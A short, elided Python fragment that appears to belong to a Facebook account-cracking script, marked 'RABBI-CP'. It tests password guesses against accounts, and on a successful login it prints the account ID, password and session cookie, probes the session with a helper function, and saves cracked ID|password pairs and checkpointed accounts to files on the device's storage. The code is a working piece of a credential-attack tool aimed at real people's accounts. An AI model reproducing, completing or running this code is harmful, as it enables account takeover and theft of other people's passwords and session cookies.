...
#            pro2 = random.choice(ugen2)
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m(test-ok  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/test-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
             ...
             #   print('\r\r\33[1;30m(RABBI-CP❌)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/test-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s[test] [%s/%s]  OK:- %s  CP:- %s '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
ud()
